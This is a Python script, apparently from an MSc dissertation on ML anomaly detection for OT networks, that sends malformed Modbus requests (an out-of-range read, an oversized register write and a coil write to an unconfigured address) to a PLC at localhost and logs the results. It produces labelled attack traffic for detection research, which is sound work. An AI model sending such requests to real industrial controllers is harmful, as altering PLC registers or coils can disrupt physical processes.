#!/usr/bin/env python3
"""
MSc Cybersecurity Dissertation
Evaluating Machine Learning Approaches for Anomaly Detection in OT Network Traffic
Dewanshi Manoj Agarkar

------------------------------------------------------------------------------
Modbus Protocol Abuse Attack
Sends unauthorized/malformed Modbus requests: illegal function codes
and out-of-range register addresses. Tests how the PLC and any
downstream detection handle protocol-level abuse rather than
legitimate-looking spoofed values (contrast with false_data_injection.py).
"""

from pymodbus.client import ModbusTcpClient
import time
import csv
from datetime import datetime

PLC_IP = "127.0.0.1"
PLC_PORT = 502
LOG_FILE = "protocol_abuse_log.csv"

def try_read_holding_registers_illegal_address(client):
    """Read from a register address far outside the PLC's configured range."""
    return client.read_holding_registers(9999, count=10)

def try_illegal_function_code(client):
    """Send a raw request with an unsupported/reserved function code (e.g. 43 - unusual/diagnostic).
    Not included in the final test run (see main)."""
    # Attempt to read device identification (function code 43/0x2B) - often unsupported on OpenPLC
    return client.read_device_information() if hasattr(client, "read_device_information") else None

def try_oversized_write(client):
    """Attempt to write to an excessive number of registers in one request (protocol abuse via oversized payload)."""
    values = [999] * 130  # Modbus spec max is 123 registers per write - this exceeds it
    return client.write_registers(0, values)

def try_illegal_coil_write(client):
    """Attempt to write a coil (function code 5) at an address not configured as a coil on this PLC."""
    return client.write_coil(500, True)

def main():
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    if not client.connect():
        print(f"Failed to connect to PLC at {PLC_IP}:{PLC_PORT}")
        return

    print("Connected to PLC. Sending protocol abuse requests...")

    tests = [
        ("illegal_read_address", try_read_holding_registers_illegal_address),
        ("oversized_write", try_oversized_write),
        ("illegal_coil_write", try_illegal_coil_write),
    ]

    with open(LOG_FILE, mode="w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["test_num", "test_name", "timestamp", "latency_ms", "result_type", "detail"])

        for i, (name, func) in enumerate(tests, start=1):
            start = time.perf_counter()
            ts = datetime.now().isoformat()
            try:
                result = func(client)
                latency_ms = (time.perf_counter() - start) * 1000
                if result is None:
                    result_type = "skipped"
                    detail = "not supported by client library"
                elif result.isError():
                    result_type = "modbus_exception"
                    detail = str(result)
                else:
                    result_type = "unexpected_success"
                    detail = str(result)
            except Exception as e:
                latency_ms = (time.perf_counter() - start) * 1000
                result_type = "python_exception"
                detail = str(e)

            writer.writerow([i, name, ts, f"{latency_ms:.3f}", result_type, detail])
            print(f"[{i}/{len(tests)}] {name}: {result_type} ({detail}) - {latency_ms:.2f} ms")
            time.sleep(3)

    client.close()
    print(f"Protocol abuse attack complete. Log saved to {LOG_FILE}")

if __name__ == "__main__":
    main()
